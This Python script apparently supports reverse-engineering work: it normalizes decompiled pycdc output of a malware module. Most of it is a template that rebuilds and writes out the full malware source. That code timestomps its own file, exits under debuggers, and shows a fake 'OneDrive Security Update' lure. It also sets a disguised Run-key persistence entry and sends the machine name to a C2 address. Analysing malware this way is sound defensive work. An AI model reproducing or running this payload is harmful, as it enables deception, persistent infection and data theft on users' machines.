#!/usr/bin/env python3
"""Normalize noisy pycdc output for the main malware module."""

from __future__ import annotations

import argparse
import pathlib
import re
import textwrap


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Clean a decompiled main .py file from pycdc."
    )
    parser.add_argument("raw_main", type=pathlib.Path, help="Raw pycdc output file")
    parser.add_argument("clean_main", type=pathlib.Path, help="Clean output path")
    return parser.parse_args()


def extract_assignments(src: str) -> dict[str, str]:
    keys = {
        "SECURE_CONFIG_BLOB": r"SECURE_CONFIG_BLOB\s*=\s*('(?:\\.|[^'])*')",
        "CDN_EDGE_NODE": r"CDN_EDGE_NODE\s*=\s*('(?:\\.|[^'])*')",
        "UPDATE_ENDPOINT": r"UPDATE_ENDPOINT\s*=\s*('(?:\\.|[^'])*')",
        "PRIMARY_C2_ADDR": r"PRIMARY_C2_ADDR\s*=\s*('(?:\\.|[^'])*')",
        "PRIMARY_C2_PORT": r"PRIMARY_C2_PORT\s*=\s*([0-9]+)",
    }
    out: dict[str, str] = {}
    for key, pattern in keys.items():
        match = re.search(pattern, src, flags=re.MULTILINE)
        if match:
            out[key] = match.group(1)
    return out


def build_clean_template(values: dict[str, str]) -> str:
    tpl = f"""
    import sys
    import time
    import base64
    import ctypes
    import os
    import winreg as reg
    import socket
    import datetime

    SECURE_CONFIG_BLOB = {values["SECURE_CONFIG_BLOB"]}
    CDN_EDGE_NODE = {values["CDN_EDGE_NODE"]}
    UPDATE_ENDPOINT = {values["UPDATE_ENDPOINT"]}
    PRIMARY_C2_ADDR = {values["PRIMARY_C2_ADDR"]}
    PRIMARY_C2_PORT = {values["PRIMARY_C2_PORT"]}


    def decrypt_config(binary_stream):
        try:
            layer1_bits = ''
            for i in range(0, len(binary_stream), 9):
                byte = binary_stream[i : i + 8]
                layer1_bits += chr(int(byte, 2))

            layer2_base64 = ''
            for i in range(0, len(layer1_bits), 8):
                byte = layer1_bits[i : i + 8]
                layer2_base64 += chr(int(byte, 2))

            return base64.b64decode(layer2_base64).decode('utf-8')
        except Exception:
            return 'http://error'


    def timestomp():
        try:
            target_date = datetime.datetime(1988, 5, 1, 0, 0, 0)
            mod_time = target_date.timestamp()
            current_file = os.path.realpath(sys.argv[0])
            os.utime(current_file, (mod_time, mod_time))
        except Exception:
            return


    def anti_debug_checks():
        if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
            sys.exit(0)

        start = time.time()
        _ = [x ** 2 for x in range(500000)]
        end = time.time()

        if end - start > 0.5:
            sys.exit(0)


    def verify_user_interaction():
        title = 'OneDrive Security Update'
        message = 'Une mise à jour critique est requise.\\nCliquez sur OUI pour installer.'
        response = ctypes.windll.user32.MessageBoxW(0, message, title, 0x1034)
        if response != 6:
            sys.exit(0)


    def persistence():
        executable_path = os.path.realpath(sys.argv[0])
        registry_path = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        key_handle = reg.OpenKey(reg.HKEY_CURRENT_USER, registry_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key_handle, 'OneDrive Update Service', 0, reg.REG_SZ, executable_path)
        reg.CloseKey(key_handle)


    def exfiltrate():
        real_c2_url = decrypt_config(SECURE_CONFIG_BLOB)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((PRIMARY_C2_ADDR, PRIMARY_C2_PORT))

        host_data = os.getenv('COMPUTERNAME').encode().hex()
        http_req = (
            f'GET /api/v2/status?id={{host_data}} HTTP/1.1\\r\\n'
            f'Host: {{PRIMARY_C2_ADDR}}\\r\\n'
            f'X-Config-Ref: {{real_c2_url}}\\r\\n'
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\\r\\n'
            'Connection: close\\r\\n\\r\\n'
        )
        s.send(http_req.encode())
        s.close()


    def main():
        timestomp()
        anti_debug_checks()
        verify_user_interaction()
        persistence()
        exfiltrate()
        time.sleep(30)


    if __name__ == '__main__':
        main()
    """
    return textwrap.dedent(tpl).lstrip()


def main() -> int:
    args = parse_args()
    src = args.raw_main.read_text(encoding="utf-8", errors="replace")
    values = extract_assignments(src)
    required = {
        "SECURE_CONFIG_BLOB",
        "CDN_EDGE_NODE",
        "UPDATE_ENDPOINT",
        "PRIMARY_C2_ADDR",
        "PRIMARY_C2_PORT",
    }
    if required.issubset(values.keys()):
        cleaned = build_clean_template(values)
    else:
        cleaned = src

    args.clean_main.parent.mkdir(parents=True, exist_ok=True)
    args.clean_main.write_text(cleaned, encoding="utf-8")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
